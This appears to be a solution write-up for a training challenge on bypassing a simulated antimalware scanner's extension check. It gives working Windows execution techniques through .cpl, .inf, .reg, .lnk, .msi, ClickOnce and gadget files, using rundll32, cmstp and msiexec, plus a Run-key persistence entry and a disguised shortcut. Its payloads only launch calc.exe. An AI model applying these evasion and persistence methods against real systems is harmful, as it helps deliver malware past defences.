---
title: "Solution 22: Uncommon Executable Extensions"
challenge_number: 22
difficulty: easy
category: "Extension Heuristic Bypass"
permalink: /solutions/22-uncommon-extensions/
---

# Solution: Uncommon Executable Extensions

[Back to Challenge](../challenges/22-uncommon-extensions.md)

## Overview

The scanner checks file extensions against a hardcoded list: `.exe`, `.bat`, `.cmd`, `.ps1`, `.vbs`, `.js`, `.wsf`, `.scr`, `.pif`, `.com`, `.hta`. This check only **warns** (never blocks). By using executable extensions that are NOT in this list, files bypass the extension heuristic entirely — no warning is even generated.

## Working Examples

### .cpl — Control Panel Applet

A `.cpl` file is actually a DLL with a `CPlApplet` export. Windows executes it via `control.exe`.

```c
// payload.c - Compile as DLL, rename to .cpl
#include <windows.h>

LONG CALLBACK CPlApplet(HWND hwnd, UINT msg, LPARAM lParam1, LPARAM lParam2) {
    if (msg == 1) { // CPL_INIT
        WinExec("calc.exe", SW_SHOW);
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) { return TRUE; }
```

```powershell
# Execute a .cpl file
control.exe .\payload.cpl
# Or directly via rundll32:
rundll32.exe shell32.dll,Control_RunDLL .\payload.cpl
```

### .msi — Windows Installer Package

MSI packages execute custom actions during installation. They can run arbitrary commands.

```powershell
# Create a minimal MSI with WiX or use msiexec to run an existing one
msiexec /i payload.msi /quiet
# Or trigger repair action on an installed MSI:
msiexec /fa payload.msi
```

### .application — ClickOnce Deployment

ClickOnce manifests download and execute .NET applications:

```xml
<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xmlns:asmv1="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity name="Payload" version="1.0.0.0" />
  <deployment install="false" mapFileExtensions="true">
    <subscription>
      <update><beforeApplicationStartup /></update>
    </subscription>
  </deployment>
  <dependency>
    <dependentAssembly codebase="Payload.exe.deploy" />
  </dependency>
</asmv1:assembly>
```

```powershell
# Trigger ClickOnce
rundll32.exe dfshim.dll,ShOpenVerbApplication .\payload.application
```

### .inf — Setup Information File

INF files can execute commands when "installed" via right-click or rundll32:

```ini
; payload.inf
[Version]
Signature="$CHICAGO$"

[DefaultInstall]
RunPreSetupCommands=RunCmd

[RunCmd]
cmd.exe /c calc.exe
```

```powershell
# Execute an INF file
rundll32.exe advpack.dll,LaunchINFSection .\payload.inf,DefaultInstall
# Or via cmstp:
cmstp.exe /s .\payload.inf
```

### .reg — Registry File

Registry files execute when merged, and can set Run keys for persistence:

```registry
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"Payload"="cmd.exe /c calc.exe"
```

```powershell
# Silent merge (requires elevation for HKLM)
reg import payload.reg
# Or double-click triggers merge prompt
regedit /s payload.reg
```

### .lnk — Windows Shortcut

Shortcuts can embed commands directly:

```powershell
# Create a .lnk that executes a command
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$PWD\readme.lnk")
$shortcut.TargetPath = "cmd.exe"
$shortcut.Arguments = "/c calc.exe"
$shortcut.IconLocation = "shell32.dll,1"  # Folder icon for social engineering
$shortcut.Save()
```

### .gadget — Windows Sidebar Gadget (Legacy)

A `.gadget` file is a renamed ZIP containing HTML/JS:

```powershell
# Create gadget structure
New-Item -ItemType Directory -Path gadget_temp
@"
<html><body>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe");
</script>
</body></html>
"@ | Set-Content "gadget_temp\main.html"

@"
<?xml version="1.0" encoding="utf-8"?>
<gadget>
  <name>Calculator</name>
  <host name="sidebar"><base type="HTML" apiVersion="1.0.0" src="main.html" /></host>
</gadget>
"@ | Set-Content "gadget_temp\gadget.xml"

Compress-Archive -Path "gadget_temp\*" -DestinationPath "payload.gadget"
```

## Why It Works

The scanner's extension check logic:

```nim
let dotPos = filename.rfind('.')
let ext = filename[dotPos+1..^1].toLowerAscii()
if ext in ["exe", "bat", "cmd", "ps1", "vbs", "js", "wsf", "scr", "pif", "com", "hta"]:
    warn("Suspicious extension")
```

Extensions like `.cpl`, `.msi`, `.inf`, `.reg`, `.lnk`, `.application`, and `.gadget` are **not in the list**. The scanner produces zero warnings for these files. Yet Windows will happily execute all of them through their registered handlers.

The fundamental flaw is that Windows has **dozens** of executable file types, and the scanner only checks 11. Any file type that Windows can execute but the scanner doesn't know about is a complete bypass.

## How to Verify

1. Create a test file with an uncommon extension:
   ```powershell
   # Create a .inf payload
   @"
   [Version]
   Signature="`$CHICAGO`$"
   [DefaultInstall]
   RunPreSetupCommands=RunCmd
   [RunCmd]
   cmd.exe /c echo PAYLOAD_EXECUTED
   "@ | Set-Content "payload.inf"
   ```

2. Run the scanner:
   ```
   nim_antimalware_sim.exe payload.inf
   ```

3. Expected result: **No extension warning** — `.inf` is not in the suspicious extension list.

4. Confirm execution works:
   ```powershell
   rundll32.exe advpack.dll,LaunchINFSection .\payload.inf,DefaultInstall
   ```

5. Compare with a `.exe` file:
   ```
   nim_antimalware_sim.exe payload.exe
   ```
   This produces an extension warning (though still only a warning, never a block).
